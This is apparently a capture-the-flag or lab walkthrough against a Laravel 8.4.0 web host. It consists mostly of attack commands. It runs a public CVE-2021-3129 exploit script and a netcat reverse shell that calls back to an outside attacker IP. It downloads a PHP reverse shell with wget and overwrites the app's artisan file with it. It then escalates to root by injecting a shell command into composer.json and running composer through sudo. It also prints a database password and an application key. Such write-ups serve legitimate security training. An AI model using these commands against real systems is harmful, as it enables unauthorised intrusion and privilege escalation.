#Pwned! 
```IP
192.168.194.38
```
# Enumeration

## HTTP 80
apache 2.4.56
vue.js 2.7.14
laravel 8.4.0

# Exploitation

https://github.com/joshuavanderpoll/CVE-2021-3129
```
python CVE-2021-3129.py --host http://192.168.194.38/ --log /var/www/html/storage/logs/laravel.log
```
```
execute rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.237 443 >/tmp/f
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.237 443 >/tmp/f
```

# PrivEsc
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129120617.png?raw=true)

## Manual
mariadb 127.0.0.1:3306
interesting writable files /dev/mqueue
pspy64
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160041.png?raw=true)

```
wget http://192.168.45.237:8000/rev.php -O rev.php
```

```
cp rev.php /var/www/html/lavita/artisan
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160546.png?raw=true)
As skunk we have sudo permissions
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160641.png?raw=true)
```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >/var/www/html/lavita/composer.json
```
```
sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129162513.png?raw=true)

## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129122446.png?raw=true)
```
mysql -p 'lavita' -u 'lavita'
```
```
sdfquelw0kly9jgbx92
```
```
APP_KEY=base64:zfXJipTpbCyrZHRDpn0/NmdpHTbAl7/hCMf476EP1LU=
```
### Mimikatz

# Lateral Movement

